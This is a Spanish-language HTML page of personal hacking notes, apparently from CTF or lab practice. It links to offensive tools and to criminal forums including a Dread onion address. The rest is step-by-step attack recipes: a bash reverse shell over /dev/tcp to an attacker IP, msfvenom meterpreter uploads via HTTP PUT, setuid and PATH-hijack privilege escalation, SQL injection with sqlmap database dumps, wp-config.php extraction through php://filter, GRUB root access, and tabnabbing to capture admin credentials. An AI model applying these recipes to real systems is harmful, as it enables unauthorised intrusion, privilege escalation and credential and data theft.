<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Exploits y Fuentes</title>
  <link rel="icon" href="images/terminal.png" type="image/png">
  <link rel="stylesheet" href="css/exploits.css">
</head>
</html>


	<header>
    <h1>Exploits</h1>
  </header>
  <section>

<h2>Sitios</h2>
 <ul>
      <li><a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">PHP Reverse Shell</a></li>
      <li><a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank">Linux Exploit Suggester</a></li>
      <li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" target="_blank>">linPEAS</a></li>
      <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank>">PayloadsAllTheThings</a></li>
      <li><a href="https://github.com/DominicBreuker/pspy" target="_blank>">pspy</a></li>
      <li><a href="https://github.com/Almorabea/Polkit-exploit" target="_blank">Polkit exploit</a></li>
      <li><a href="https://github.com/boiledsteak/EJS-Exploit/tree/main/attacker" target="_blank">EJS exploit</a></li>
      <li><a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a></li>
      <li><a href="https://pentestmonkey.net" target="_blank">pentestmonkey</a></li>
      <li><a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a></li>
      <li><a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a></li>
      <li><a href="https://github.com/OlivierProTips" target="_blank">OlivierProTips</a></li>
      <li><a href="https://www.dcode.fr/es" target="_blank">dCode</a></li>
      <li><a href="https://www.md5online.org" target="_blank">MD5 Online</a></li>
      <li><a href="https://hackforums.net/" target="_blank">Hack Forums</a></li>
      <li><a href="https://xss.is/" target="_blank">XSS.IS</a></li>
      <li><a href="https://exploit.in/" target="_blank">exploit.in</a></li>
      <li><a href="dreadytognbh7m5nlmqsogzzlxjy75iuxkulewbhxcorupbqahact2yd.onion" target="_blank">Dread (requiere Tor)</a></li>
      <li><a href="https://book.hacktricks.wiki/" target="_blank">HackTricks</a></li>
    </ul>



  </section>


  <article>

    <h2>Shell reversa con php en wp-admin</h2>

    <p>
        Al iniciar sesion en wp-admin, si hay acceso a la seccion Appearance y hay codigo php, se puede pegar codigo de 
        un php para conseguir una shell reversa.
    </p>

     <h2>Nombre personalizado de un dominio en una ip</h2>

    <p>
      Al entrar a una ip, y aparece con un nombre de dominio <code>http://vtcsec</code> y 
      no permite acceder, se soluciona de la siguiente manera.
      Ejecute <code>sudo nano /etc/hosts</code> para acceder al dominio, una vez dentro coloque la ip y el nombre que aparece 
      <code>10.2.168.99	  vtcsec</code>, guardalo y ya se puede acceder al sitio. 
    </p>

    <h2>chkrootkit 0.49</h2>

    <p>Para explotar este chkrootkit desactualizado debemos estar en <code>"/tmp"</code>, luego ejecutar 
      <code> echo "/bin/bash" > /tmp/update </code>, luego <code> echo "chmod +s /bin/bash" >> /tmp/update </code>, y finalmente <code> /bin/bash -p </code>. Con esta serie de comandos
    crea un archivo <code>/tmp/update</code> que, al ejecutarse, establece el setuid en <code>/bin/bash</code> lo que permite 
    ejecutar bash con privilegios elevados y luego ejecuta <code>/bin/bash -p</code> como usuario root.
    </p>

    <h2>Payload php inverso con metasploit y msfvenom a una pagina con metodo HTTP PUT</h2>

    <p>Para verificar si podemos aprovechar y ejecutar este truco, usamos <code>curl -v -X OPTIONS (ip o url)</code>, si acepta metodo PUT, 
      es un buen comienzo. Al tener un servidor con metodo HTTP PUT, se pueden subir archivos con <code>curl -T archivo 
      (ip/ruta/archivo) --http1.0</code>, podemos aprovechar esta vulnerabilidad para subir una shell inversa. 
      <br>Para crear la shell y subirlo a la maquina victima usamos <code>sudo msfvenom -p php/meterpreter_reverse_tcp LHOST=(ip atacante) 
      LPORT=(funciona mejor con el 443) -f raw > archivo</code>. 
      Una vez creado el archivo, ejecutamos metasploit y usamos el <code>exploit/multi/handler</code> y seleccionamos el payload 
      <code>payload/php/meterpreter_reverse_tcp</code>, lo configuramos con nuestra ip atacante y el puerto que hayamos elejido, despues corremos 
      el exploit y ejecutamos la shell que subimos al servidor.
    </p>

    <h2>
      Shell reversa a traves de un sitio web con php inseguro
    </h2>
    <p>
      Si nos encontramos en una situacion como esta <code> http://10.10.10.10/site/busque.php?buscar= [comando] </code>, donde un php permite ejecutar comandos del sistema, podemos aprovechar esto para generar una shell reversa, <code> /bin/bash -c 'bash -i >& /dev/tcp/ip atacante/puerto 0>&1' </code>, 
      este comando debemos colocarlo donde el php nos permite enviar codigo, probablemente tengamos que codificarlo en URL por lo que deberia quedar asi <code> E10%2F443%200%3E%261%27 </code>. <br>Una vez codificado debemos usar dos terminales de la maquina atacante, en una colocamos un 
      <code> nc -lvnp [puerto que hayamos elejido]</code>, y ejecutar en la otra el comando <code> curl "http://10.10.10.10/site/busque.php?buscar=E10%2F443%200%3E%261%27" </code>, finalmente volvemos a la terminal del netcat y ya acabaremos dentro de la maquina.

    </p>

	<h2>Tabnabbing inverso</h2>

	<p>
	Si en una pagina nos encontramos con el parametro <code> target="_blank" </code>, se puede explotar usando una replica de la pagina de inicio de sesión, incitando al administrador a introducir sus credenciales cuando haga clic en nuestro enlace, lo que debe contener es este script:
	<a href="txt/tabnabbing.txt" target="_blank">Exploit Tabnabbing</a>. Una vez creado el script debemos guardarlo como html, y en el directorio donde tengamos el script en html y la pagina de login, abrimos un <code>python3 http.server 80</code>, en otro lado un 
  <code>nc -lvnp [puerto del script]</code> y a esperar a que la victima ponga sus credenciales.	
	</p>
	

	<h2>Exploit Fuel CMS 1.4.1</h2>

	<p>Si en un servidor nos encontramos con un login asi <code>http://IP/structure/index.php/fuel/login/</code> podemos usar un script que inyecta una shell reversa al ejecutarlo <a href="txt/fuelCMS1.4.1.txt" target="_blank">Exploit Fuel CMS 1.4.1</a>. Lo ejecutas asi <code>python3 exploit.py</code>. 
    Con esto conseguimos un acceso de comandos remoto. Y podriamos generar una reverse shell por ej <code>nc -c sh IP 4444</code> y en otra consola ponemos un <code>nc -lvnp 4444</code></p>
    
	<h2>Aplicacion web python hecha con Pickle </h2>
	<p>Si en una maquina nos encontramos con esto: <a href="txt/pickle1.txt" target="_blank">Ejemplo</a>, es un script que recibe datos, los decodifica y los ejecuta como código. Podemos aprovecharlo creando esto: <a href="txt/pickle2.txt" target="_blank">Exploit Pickle</a>, en el exploit hay que colocar una 
    bash reversa con nuestra ip y un puerto, cuando lo ejecutemos con <code>python3 exploit.py</code> nos devolvera algo asi <code>b'gASVRgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtl'</code>, copiamos lo que esta dentro de las comillas, pero antes revisemos que puerto maneja la app con <code>netstat -tulpn</code>, 
    en este caso el 5000, y recordemos la ruta del endpoint de la app del primer ejemplo <code>/heaven</code> y el parámetro que recibe el servidor por post <code>awesome</code>. Despues tenemos que tener una consola con un <code>nc -lvnp 4444</code> y, en la maquina victima ponemos con el codigo que nos 
    paso el exploit lo siguiente: <code>curl -d "awesome=gASVRgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtl" -X POST http://127.0.0.1:5000/heaven</code>. Una vez ejecutamos el comando, el nc nos dará acceso a la maquina victima como root.</p>

    <h2>CMS Coldfusion</h2>
    <p>Si en un servidor corre ColdFusion, este CMS (Content Management System) permite inyecciones de codigo como SQL, en especial si tiene versiones desactualizadas, un punto de arranque es el siguiente directorio <code>http://IP/CFIDE/Administrator/</code>, donde se puede alojar un <code>login.php</code>
    . Una vez en la pagina de login, ejecutemos Burp Suite, vamos a Proxy -> Intercept -> Open Browser y nos dirigimos al directorio mencionado. Podemos hacer una inyeccion SQL en el apartado de contraseña <code>' OR '1'='1</code>, una vez logueado, volvemos a Burp Suite -> HTTP History -> Request, seleccionamos toda la request
  y la guardamos como <code>testing.sql</code>, despues en una consola ejecutamos <code>sqlmap -r testing.sql --dbs</code>, al recibir las base de datos podemos hacer esto, <code>sqlmap -r testing.sql -D BaseDeDatos --dump-all</code> con esto podremos encontrar informacion importante.</p>

    <h2>Extraer php a traves de filtros</h2>
    <p>Cuando en una pagina encontramos un php que puede ejecutar codigo <code>http://ejemplo.com/codigo.php?comando=...</code> posiblemente no nos deje ver todo lo que contiene, si queremos ver un archivo como <code>wp-config.php</code> que contiene informacion sensible, podemos usar un filtro para obtener lo que queremos.
      Uno de estos filtros que pueden ser utiles es <code>http://ejemplo.com/codigo.php?comando=php://filter/convert.base64-encode/resource=wp-config.php</code>, lo que nos regrese lo decodificamos en base64.</p>
  
      <h2>Como aprovechar un script SH para ganar acceso root</h2>

      <p>Si en un sistema nos encontramos con un archivo con este tipo de permisos <code>-rwxrwxrwx root root /home/usuario/script.sh</code> podemos sobrescribirlo sin utilizar nano ni vim, <code>echo "chmod u+s /bin/bash" >> /home/usuario/script.sh</code> Con esto hacemos que cualquier usuario que ejecute <code>/bin/bash</code> este se ejecutara como root,
        para ejecutar la bash con privilegios ejecutamos <code>/bin/bash -p</code>, con esto ya seremos root.
      </p>

      <h2>Vulnerabilidad con las cookies</h2>

      <p>Usando BurpSuite en una pagina de inicio de sesion, colocando cualquier credencial, me encuentro con este response: <a href="/txt/response.txt" target="_blank">Response 1</a> las cookies al decodificarlas tienen informacion <code>role = admin</code>, en este caso role es un valor de privilegios de usuario, que se pueden aprovechar para vulnerar el sitio.
      Presionamos en la opcion <code>Send to Repeater</code>, luego haciendo fuzzing me encuentro con un php accesible solo por el admin, con BurpSuite le doy a Repeater y modificamos la cookie role por <code>admin</code> y deberia quedar asi: <a href="txt/response2.txt" target="_blank">Response 2</a>.</p>

        <h2>Vulnerabilidad qdPM 9.2</h2>
        
        <p>En esta herramienta existe una ruta que es accesible donde se guarda la contraseña y la cadena de conexión de la base de datos están almacenadas en un archivo YML. Para acceder al archivo YML, la ruta es <code>http://(sitioWeb)/core/config/databases.yml</code>.</p>

        <h2>Ganar acceso root desde el arranque</h2>
        
        <p>Cuando iniciamos una maquina linux, tenemos un menu de arranque, comunmente es GRUB, este a menos que tenga contraseña nos permite editar el arranque, en caso de emergencia podemos acceder a la maquina como root. Como primer paso hay que ubicar una linea que comience por <code>linux /boot/vmlimuz-x.x.x</code>, 
          lo siguiente es llegar a la linea que arranque por <code>ro quiet</code>, debemos eliminarlo y colocar <code>rw single init=/bin/sh</code>.</p>
    
        <h2>Escalada de privilegios con un binario</h2>
        
        <p>En un binario por ej este <code>/opt/get_access</code> si encontramos un comando ejecutado sin ruta absoluta por ej <code>cat /root/system.info</code> la forma correcta de hacerlo es asi <code>/bin/cat</code>, como consecuencia de este error podemos explotarlo de esta manera. Primero ejecutamos <code>echo $PATH</code> Muestra la variable PATH: el orden de directorios donde el shell busca ejecutables cuando llamas a un comando por nombre (Ejemplo cat, ls). 
          Luego <code>echo '/bin/bash' > /tmp/cat</code> crea un archivo cat que contiene una bash, luego <code>export PATH=/tmp:$PATH</code> que envia /tmp al principio, para cuando busque un comando por nombre empezara primero por /tmp antes que /bin y /usr/bin. Luego <code>echo $PATH</code>, para comprobar que /tmp va primero, despues <code>chmod +x /tmp/cat</code> y por ultimo ejecutamos el binario inicial <code>/opt/get_access</code>.</p>

        <h2>Shell inversa a traves de BurpSuite</h2>
        <p>En una pagina que muestra fecha, dia y horario existe una vulnerabilidad para ejecutar codigo en base58: <a href="txt/bps1.txt" target="_blank">pagina</a> (sirve en cualquier tipo de codificacion). Ahora ejecutamos Burp Suite, vamos a Proxy -> Intercept -> Open Browser. Con el navegador interceptamos la request del comando, que en este caso ejecuta un reloj, presionamos donde dice Send to Repeater y pegamos esto en 
          base58: <a href="txt/bps2.txt" target="_blank">comando</a>, abrimos un netcat a la escucha en el puerto que hayamos elegido y la request quedaria asi: <a href=txt/bps3.txt target"_blank">request</a> le damos a Send, con eso deberiamos tener acceso a la maquina.</p>
        
        <h2>Express file upload exploit</h2>

        <p>Cuando en un servidor encontramos una herramienta para subir archivos en aplicaciones web, como en este caso Express File Upload, podemos explotarlo de esta manera. Llevamos a nuestra maquina victima este script hecho en python: <a href=txt/ejsExploit.txt target="_blank">exploit</a>. En otra consola abrimos un netcat y lo ejecutamos asi <code>python3 exploit.py</code>.</p>

        <h2>lxd alpine exploit</h2>

        <p>Si en una maquina al hacer <code>id</code> nos encontramos con esto uid=1000(floki) gid=1000(floki) groups=1000(floki),4(adm),24(cdrom),30(dip),46(plugdev),<code>108(lxd)</code>, podemos conseguir acceso root de la siguiente manera: <a href="txt/instruccioneslxd.txt" target="_blank">Instrucciones</a>.</p>
        
        <h2>Fuzzing a parametro GET en BurpSuite</h2>
        
        <p>En un sitio descubri un parametro (http://ip/?page_no= ) que podria tener una ruta oculta, primero interceptamos la web, y le damos a la opcion <code>Send to Intruder</code>, despues hay que seguir estas instrucciones:  <a href="images/bsfuzz1.png" target="_blank">paso 1</a> y <a href="images/bsfuzz2.png" target="_blank">paso 2</a></p>
        
        <h2>Inyeccion XML</h2>

        <p>Me encuentro con un sitio con un parametro email que refleja lo que escribo: <a href="images/xml1.png" target="_blank">Pagina</a>. Al pasarlo a BurpSuite donde vamos a inyectarle codigo malicioso quedaria asi: <a href="images/bsfuzz2.png" target="_blank">BurpSuite</a>. Le voy a inyectar este codigo malicioso hay dos formas sencillas:<a href="txt/xmlinjection1.txt">opcion 1</a> y si queremos podemos usar base64 <a href="txt/xmlinjection2.txt">opcion 2</a></p>

        <h2>Exploit CAP_SYS_PTRACE con python</h2>
        
        <p>Para reconocer esta vulnerabilidad hacemos <code>getcap -r / 2>/dev/null</code> y nos debe devolver <code>/usr/bin/python2.7 = cap_sys_ptrace+ep</code> con esto ya podemos crear un exploit, primero debemos tener identificado el proceso de la captura: <a href="images/CAP_SYS_PTRACE.png" target="_blank">ps aux</a>. Este es el <a href="txt/CAP_SYS_PTRACE.txt" target="_blank">exploit</a> de python que debemos ejecutar asi <code>python2.7 exploit.py (num del proceso)</code>, con esto nos deberia abrir un puerto
        5600, que lo ponemos en escucha con un <code>nc 127.0.0.1 5600</code> y ya seremos usuario root</p>

        <h2>
      Directorios de interes
        </h2>
      <p>
      /etc/crontab [se pueden ver que tareas se ejecutan en el sistema periodicamente]
      <br>/var/www/html [se suele alojar un servicio web]
      <br>/var/spool/cron/crontabs/ [archivos cron por usuario]
      <br>/etc/cron.d/ [archivos cron adicionales definidos por el administrador]
      <br>/etc/cron.daily/, /etc/cron.hourly/, /etc/cron.weekly/, /etc/cron.monthly/ [directorios con scripts para ejecutar tareas en intervalos específicos]
      <br>/etc/cron.allow y /etc/cron.deny [archivos para controlar el acceso a cron]
      <br>/etc/anacrontab [tareas periódicas para sistemas que no están siempre encendidos]
      <br>/usr/lib/python3.9/ [es una ruta en tu sistema Linux donde se encuentran los archivos esenciales de la instalación de Python 3.9. 
      Contiene las bibliotecas y módulos que Python necesita para funcionar correctamente en el sistema, así como las dependencias necesarias para su ejecución]
      <br>/var/backups [copias de seguridad automáticas o respaldos de configuraciones importantes del sistema]
      </p>
      </article>

  